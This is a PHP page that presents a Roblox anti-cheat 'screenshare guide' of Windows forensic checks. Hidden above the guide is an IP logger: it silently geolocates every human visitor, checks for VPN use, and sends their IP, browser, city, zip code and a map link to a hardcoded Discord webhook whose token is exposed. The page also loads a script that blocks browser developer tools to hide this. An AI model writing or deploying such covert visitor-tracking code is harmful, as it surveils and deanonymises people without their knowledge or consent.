<?php

$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];
$Hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$Webpage = $_SERVER['SCRIPT_NAME'];
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

date_default_timezone_set("America/New_York");
$Date = date('d/m/Y');
$Time = date('G:i:s');

$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNDet = json_decode(file_get_contents("https://proxycheck.io/v2/{$IP}?vpn=1&asn=1"));
if ($VPNDet->proxy === "yes") {
    $VPN = "true";
} else {
    $VPN = "false";
}

$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$Org = $Details->org;
$Webpage = $_SERVER['SCRIPT_NAME'];
$Details->countryCode = strtolower($Details->countryCode);


class Discord
{
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Org, $Webpage,  $Lat, $Lon,  $Flag;

        $Webhook = "https://discord.com/api/webhooks/1065004702061830326/T5vqqQkqKlXEXKC3BJeQKtTVId7va3wqBrw3a0HuMCwPJ28oRgg8QW4Fm97AiisOIY3o";

        $InfoArr = array(
            "embeds" => [array(

                "title" => "Visitor From $Country",
                "color" => "2303786",

                "fields" => [array(
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "VPN",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "Organization",
                        "value" => "$Org",
                        "inline" => true
                    ),
                    array(
                        "name" => "GEO Lookup",
                        "value" => "https://json.geoiplookup.io/$IP",
                    ),
                    array(
                        "name" => "Browser",
                        "value" => "$Browser"
                    ),
                    array(
                        "name" => "Country/CountryCode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "Region | City | Zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    ),
                    array(
                        "name" => "Webpage",
                        "value" => "$Webpage",
                        "inline" => true
                    ),],

                "footer" => array(
                    "text" => "$Date $Time",
                    "icon_url" => ""
                ),
            )],
        );

        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
		        return curl_exec($Curl);
    }
}
$sendembed = New Discord();
$sendembed->Visitor();
?>
<!DOCTYPE html>
<html>

<head>

<title>screenshare guide by reese</title>
  <link rel="stylesheet" type="text/css" href="/assets/css/page.css">
  <link rel="stylesheet" href="assets/css/page.css?ver=7">
  <script disable-devtool-auto src="assets/js/disable-devtool.min.js?ver=2"></script>
  <script src="assets/js/pch.js?ver=50"></script>
  <meta charset="UTF-8">
</head>
<div class="show-container" style="padding-left: 20px;">
    <pre style="color: white; margin: 0;">
                                                                   |V|
                                                                .::| |::.
                                                               ::__| |__::
                                                              >____   ____<
                                                               ::  | |  ::
                                                                '::| |::'
                                                                   | |
                                                                   | |
                                                                   |A|
												  
								

									   
							       //2023 REESE ULTIMATE SCREENSHARE GUIDE\\  
					     ╔════════════════════════════════════════════════════════════╗
					     ║                          INDEX                             ║
					     ║                                                            ║
					     ║                  0x01 - Recycle bin clearing               ║
					     ║                  0x02 - REGEDIT method                     ║
					     ║                  0x03 - PREFETCH method                    ║ 
					     ║                  0x04 - RECENT method                      ║
					     ║                  0x05 - CMD Journal method (OP AS FUCK)    ║ 
					     ║                  0x06 - Misc tools 4 screensharing         ║
					     ║                                                            ║
					     ║                                                            ║
					     ╚════════════════════════════════════════════════════════════╝
						 
						 
						 
						 
					-->> 0x01 "Recycle Bin Method" - Using this method allows you to see when the users recycle bin was last cleared. <<--
					1. Type in "run" in their windows search bar and type in "$Recycle.Bin"
					2. Click the view button and click on the VIEW tab.
					3. Scroll until you see "Hide Protected Operating System Files"
					4. Enable it, whatever the recycle bin was last modified to was the time they cleared / modified it.
					
					
					-->>  0x02 "Regedit Method" - Using this allows you to see *SOME* last opened files. <<--
					1. Type in "REGEDIT" in the windowss search bar.
					2. In the path directory, paste in: 
					Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store
					
					
					
					-->> 0x03 "PREFETCH method" - Using this allows you to see recently opened EXES. (Easily bypassible) <<--
					1. Type in "run" in their windows search bar and search "prefetch" in it.
					2. At the top of their file explorer, there will be a button that says Date Modified, click it.
					3. Once youve done that, you can search for cheat names in the top right, or just scroll through their entire prefetch history.
					
					
					
					-->> 0x04 "RECENT method" - Using this allows you to see recently opened files / folders. (Easily bypassible) <<--
					1. Type in "run" in their windows search bar and search "recent" in it.
					2. At the top of their file explorer, there will be a button that says Date Modified, click it.
					
					
					
					-->> 0x05 "CMD Journal method" - Using this method will literally catch any cheater. explained throughout this tutorial. <---
					1. Run CMD as *ADMINISTRATOR <<<<<<<<<<<<<<<<<* and copy this:
					fsutil usn readjournal c: csv > AllTheJournal.txt
					2. Paste it in and once its done querying, type in: AllTheJournal.txt
					3. Click CTRL + F and check "Match case" and "Wrap around"
					4. Type in cheat names in the search prompt.
					<iframe width="560" height="315" src="https://www.youtube.com/embed/7qq_4-z4ov8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
					// NOTES FOR THE METHOD ABOVE \\ 
					
					*TIP 1
					If you're searching for *ONLY* files that have been deleted, instead of running the above command, run:
					fsutil usn readjournal c: csv | findstr /i /c:.exe | findstr /i /c:0x80000200 >> DeletedExes.txt
					Then: 
					DeletedExes.txt
					
					*TIP 2
					If you're screensharing someone on roblox, you can search these strings below, 
					if anything pops up and the timestamp is right, they're unlegit.
					"SYNAPSE L" - Synapse String
					".bin" - Synapse String
					"flux" - Fluxus String
					"SynapseInjector" - Synapse String
					
					-->> 0x06 "Misc Tools 4 Screensharing"<<--
					https://www.nirsoft.net/utils/lastactivityview.zip - Views last opened programs
					
					